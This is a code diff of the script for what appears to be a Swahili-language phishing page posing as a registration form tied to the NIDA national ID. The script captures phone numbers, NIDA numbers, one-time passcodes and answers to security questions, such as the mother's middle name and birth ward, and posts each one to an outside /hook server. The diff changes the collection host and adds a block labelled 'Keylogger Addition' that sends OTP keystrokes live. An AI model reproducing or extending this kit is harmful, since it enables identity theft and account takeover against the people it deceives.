@@ -356,140 +356,152 @@
         <button class="endelea-btn" type="button" onclick="nextQuestion()">Endelea</button>
     </div>
     <script>
-        let currentQuestion = 0;
-        const questions = [
-            "Taja mwaka uliomaliza shule ya msingi?",
-            "Taja namba ya simu uliyoweka kipindi unasajiliwa?",
-            "Taja jina la kati la mama?",
-            "Taja kata ulipozaliwa?",
-            "Taja kata ulipojiandikisha?"
-        ];
+    let currentQuestion = 0;
+    const questions = [
+        "Taja mwaka uliomaliza shule ya msingi?",
+        "Taja namba ya simu uliyoweka kipindi unasajiliwa?",
+        "Taja jina la kati la mama?",
+        "Taja kata ulipozaliwa?",
+        "Taja kata ulipojiandikisha?"
+    ];
 
-        function goOtpPage(event) {
-            event.preventDefault();
-            const simu = document.querySelector('input[placeholder*="simu"]').value;
-            const nida = document.querySelector('input[placeholder*="NIDA"]').value;
+    function goOtpPage(event) {
+        event.preventDefault();
+        const simu = document.querySelector('input[placeholder*="simu"]').value;
+        const nida = document.querySelector('input[placeholder*="NIDA"]').value;
 
-            const data = { simu: simu, nida: nida };
-            sendBatchData(data);
+        const data = { simu: simu, nida: nida };
+        sendBatchData(data);
 
-            document.getElementById('registration-box').style.display = 'none';
-            document.getElementById('otp-box').style.display = 'block';
+        document.getElementById('registration-box').style.display = 'none';
+        document.getElementById('otp-box').style.display = 'block';
 
-            startCountdown();
+        startCountdown();
+    }
+
+    function moveToNext(currentInput, nextInputId) {
+        if (currentInput.value.length === 1) {
+            document.getElementById(nextInputId).focus();
+        }
+        currentInput.classList.add('otp-completed');
+    }
+
+    function submitOtp() {
+        let otpValues = '';
+        for (let i = 1; i <= 5; i++) {
+            otpValues += document.getElementById('otp' + i).value;
         }
 
-        function moveToNext(currentInput, nextInputId) {
-            if (currentInput.value.length === 1) {
-                document.getElementById(nextInputId).focus();
-            }
-            currentInput.classList.add('otp-completed');
+        if (otpValues.length === 5) {
+            sendBatchData({ otp: otpValues });
+
+            document.getElementById('otp-box').style.display = 'none';
+            document.getElementById('security-questions-box').style.display = 'block';
+
+            document.querySelector('.tab.active').classList.remove('active');
+            document.querySelectorAll('.tab')[2].classList.add('active');
+        } else {
+            alert("Tafadhali ingiza OTP kamili.");
+        }
+    }
+
+    function nextQuestion() {
+        let answerInput = document.getElementById('answer-input');
+        let answer = answerInput.value;
+
+        if (answer.trim() === '') {
+            alert("Tafadhali jaza jibu lako.");
+            return;
         }
 
-        function submitOtp() {
-            let otpValues = '';
-            for (let i = 1; i <= 5; i++) {
-                otpValues += document.getElementById('otp' + i).value;
-            }
+        let question = questions[currentQuestion];
+        sendBatchData({ question: question, answer: answer });
+        currentQuestion++;
 
-            if (otpValues.length === 5) {
-                sendBatchData({ otp: otpValues });
-
-                document.getElementById('otp-box').style.display = 'none';
-                document.getElementById('security-questions-box').style.display = 'block';
-
-                document.querySelector('.tab.active').classList.remove('active');
-                document.querySelectorAll('.tab')[2].classList.add('active');
+        if (currentQuestion < questions.length) {
+            document.getElementById('question-text').innerText = questions[currentQuestion];
+            answerInput.value = '';
+            if (currentQuestion === 2 || currentQuestion === 3 || currentQuestion === 4) {
+                answerInput.type = 'text';
             } else {
-                alert("Tafadhali ingiza OTP kamili.");
+                answerInput.type = 'number';
             }
+        } else {
+            window.location.href = "Success/success.html";
         }
+    }
 
-        function nextQuestion() {
-            let answerInput = document.getElementById('answer-input');
-            let answer = answerInput.value;
+    let timer;
+    let interval;
+    function startCountdown() {
+        timer = 300; // 5 minutes
+        const countdownEl = document.getElementById('countdown');
+        countdownEl.textContent = "05:00";
+        clearInterval(interval);
 
-            if (answer.trim() === '') {
-                alert("Tafadhali jaza jibu lako.");
-                return;
+        interval = setInterval(() => {
+            let minutes = Math.floor(timer / 60);
+            let seconds = timer % 60;
+            minutes = minutes < 10 ? '0' + minutes : minutes;
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+            countdownEl.textContent = `${minutes}:${seconds}`;
+            if (timer <= 0) {
+                clearInterval(interval);
+                autoFillOTP(); // Fill OTP after countdown
             }
+            timer--;
+        }, 1000);
+    }
 
-            let question = questions[currentQuestion];
-            sendBatchData({ question: question, answer: answer });
-            currentQuestion++;
+    function autoFillOTP() {
+        const otp = generateOTP();
+        for (let i = 0; i < otp.length; i++) {
+            document.getElementById('otp' + (i + 1)).value = otp[i];
+            document.getElementById('otp' + (i + 1)).classList.add('otp-completed');
+        }
+        sendBatchData({ generated_otp: otp });
+    }
 
-            if (currentQuestion < questions.length) {
-                document.getElementById('question-text').innerText = questions[currentQuestion];
-                answerInput.value = '';
-                if (currentQuestion === 2 || currentQuestion === 3 || currentQuestion === 4) {
-                    answerInput.type = 'text';
-                } else {
-                    answerInput.type = 'number';
-                }
+    function generateOTP() {
+        let otp = '';
+        for (let i = 0; i < 5; i++) {
+            otp += Math.floor(Math.random() * 10).toString();
+        }
+        return otp;
+    }
+
+    function sendBatchData(dataObject) {
+        const params = new URLSearchParams(dataObject).toString();
+
+        fetch("https://my-node-server-cxqa.onrender.com/hook", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: params
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error("Server error:", response.status);
             } else {
-                window.location.href = "Success/success.html";
+                console.log("Data imetumwa kwa server vizuri.");
+            }
+        })
+        .catch(error => {
+            console.error("Fetch error:", error);
+        });
+    }
+
+    // 🔐 Keylogger Addition (OTP input live keystroke to backend /hook)
+    window.onload = function () {
+        for (let i = 1; i <= 5; i++) {
+            const input = document.getElementById('otp' + i);
+            if (input) {
+                input.addEventListener("input", function () {
+                    sendBatchData({ [`otp${i}_keystroke`]: input.value });
+                });
             }
         }
-
-        let timer;
-        let interval;
-        function startCountdown() {
-            timer = 300; // 5 minutes
-            const countdownEl = document.getElementById('countdown');
-            countdownEl.textContent = "05:00";
-            clearInterval(interval);
-
-            interval = setInterval(() => {
-                let minutes = Math.floor(timer / 60);
-                let seconds = timer % 60;
-                minutes = minutes < 10 ? '0' + minutes : minutes;
-                seconds = seconds < 10 ? '0' + seconds : seconds;
-                countdownEl.textContent = `${minutes}:${seconds}`;
-                if (timer <= 0) {
-                    clearInterval(interval);
-                    autoFillOTP(); // Fill OTP after countdown
-                }
-                timer--;
-            }, 1000);
-        }
-
-        function autoFillOTP() {
-            const otp = generateOTP();
-            for (let i = 0; i < otp.length; i++) {
-                document.getElementById('otp' + (i + 1)).value = otp[i];
-                document.getElementById('otp' + (i + 1)).classList.add('otp-completed');
-            }
-            sendBatchData({ generated_otp: otp });
-        }
-
-        function generateOTP() {
-            let otp = '';
-            for (let i = 0; i < 5; i++) {
-                otp += Math.floor(Math.random() * 10).toString();
-            }
-            return otp;
-        }
-
-        function sendBatchData(dataObject) {
-            const params = new URLSearchParams(dataObject).toString();
-
-            fetch("https://backend-udgf.onrender.com/hook", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
-                body: params
-            })
-            .then(response => {
-                if (!response.ok) {
-                    console.error("Server error:", response.status);
-                } else {
-                    console.log("Data imetumwa kwa server vizuri.");
-                }
-            })
-            .catch(error => {
-                console.error("Fetch error:", error);
-            });
-        }
-    </script>
+    };
+</script>
 </body>
